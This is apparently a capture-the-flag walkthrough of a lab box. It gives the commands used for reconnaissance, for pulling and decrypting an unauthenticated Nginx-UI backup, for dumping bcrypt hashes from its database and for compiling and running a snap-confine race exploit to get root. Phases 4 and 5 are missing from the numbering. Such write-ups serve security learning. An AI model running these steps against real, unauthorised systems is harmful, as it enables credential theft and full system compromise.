[1] Phase 1: Reconnaissance & User Flag

Initial Port Scan

sudo nmap -sCV -T4 10.129.46.115 -Pn
Why -sCV? Combines -sC (default scripts) and -sV (version detection) to identify service versions — critical for matching CVEs.
Why -T4? Faster timing template; aggressive but stable for CTF environments.
Why -Pn? Skip host discovery (ICMP may be blocked); assumes target is up.

Results showed ports 22 (SSH) and 80 (HTTP). The web server redirected to snapped.htb, requiring a hosts file entry.

Subdomain Enumeration

ffuf -u http://10.129.46.115 -H "Host: FUZZ.snapped.htb" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \

Why ffuf? Fast, flexible fuzzer that tests virtual hosts by modifying the Host header.
Why -ac? Auto-calibration automatically filters out false positives by learning response patterns.

[2] Phase 2: Exploiting CVE-2026-27944

Nginx-UI versions up to 2.3.2 expose the /api/backup endpoint without authentication — a critical misconfiguration.

curl -v http://admin.snapped.htb/api/backup -o backup.zip
Why -v? Verbose output shows response headers, revealing the X-Backup-Security header containing the AES encryption key and IV.

The backup contained three files: hash_info.txt, nginx-ui.zip, and nginx.zip. The nginx-ui.zip was AES-256-CBC encrypted.

# Extract key and IV as hex for OpenSSL
KEY_HEX=$(echo "QCvgLBgbXhyX2HQDp87klWsyK4zgkDEFSAWgUWaCSq4=" | base64 -d | xxd -p -c 32)
IV_HEX=$(echo "eR7i8ltmHUEO3fSixp4flQ==" | base64 -d | xxd -p -c 16)

# Decrypt the inner zip
openssl enc -d -aes-256-cbc -K $KEY_HEX -iv $IV_HEX -in nginx-ui.zip -out nginx-ui_dec.zip
unzip nginx-ui_dec.zip -d nginx-ui
Why convert to hex? OpenSSL expects the key and IV in hexadecimal format; base64 -d decodes from base64, then xxd -p converts to hex.

Extracting Credentials

sqlite3 nginx-ui/database.db "SELECT name, password FROM users;"

The database contained bcrypt hashes for admin and jonathan users.

Why bcrypt format? The hash begins with $2a$10$, identifying it as bcrypt with cost factor 10. John the Ripper handles this natively.

[3] Phase 3: Privilege Escalation — CVE-2026-3888

The target runs snapd 2.63.1+24.04 — confirmed vulnerable to the snap-confine race condition.

Understanding the Vulnerability

CVE-2026-3888 is a Time-Of-Check Time-Of-Use (TOCTOU) race in snap-confine's bind-mount sequence. systemd-tmpfiles periodically deletes stale directories in /tmp, including /tmp/.snap. By replacing this directory during the race window, an attacker can inject a malicious dynamic linker that executes as root.

Crucial Requirement: The vulnerability only triggers when systemd-tmpfiles actually runs. On Ubuntu 24.04, this is configured with a 30-day interval by default.

Exploit Preparation

# On Kali — compile the exploit
gcc -O2 -static -o exploit exploit_suid.c
gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c

# Transfer to target
scp exploit librootshell.so jonathan@10.129.46.115:/tmp/

# On target
cd /tmp
chmod +x exploit librootshell.so
./exploit librootshell.so
Why -static? Static linking ensures the exploit runs independently of target libraries — critical when the target may have missing dependencies.
Why -nostdlib? The malicious library uses raw syscalls; including the standard library would add unnecessary overhead and potential detection vectors.
Error Encountered: renameat2: No such file or directory
Diagnosis: The exploit expects /tmp/.snap to be deleted by systemd-tmpfiles before racing. Checking the journal revealed the timer had never fired. 
journalctl -u systemd-tmpfiles-clean | tail -20
-- No entries --
Root Cause: The 30-Day Cleanup Timer
On Ubuntu 24.04, systemd-tmpfiles-clean.timer is configured with OnCalendar=monthly (30 days). A freshly booted machine hasn't triggered this cleanup yet — the race window doesn't exist.

[6] Key Takeaways

CVE-2026-27944 — Nginx-UI's backup endpoint is completely unauthenticated. Always audit API endpoints when reviewing web applications.
SQLite Database Extraction — Embedded databases often contain credential hashes. Always check for .db or .sqlite files in extracted backups.
Password Cracking — rockyou.txt remains the most effective wordlist for CTF environments. bcrypt requires patience — cost factors of 10+ mean 1000+ rounds per hash.
CVE-2026-3888 — The snapd race condition has a hidden prerequisite: systemd-tmpfiles must have cleaned /tmp/.snap at least once. On Ubuntu 24.04, this is a 30-day interval. Always check systemctl cat systemd-tmpfiles-clean.timer before attempting this exploit.
Tool Choice Matters — -sCV saved time by combining script execution and version detection; -ac in ffuf reduced false positives significantly.
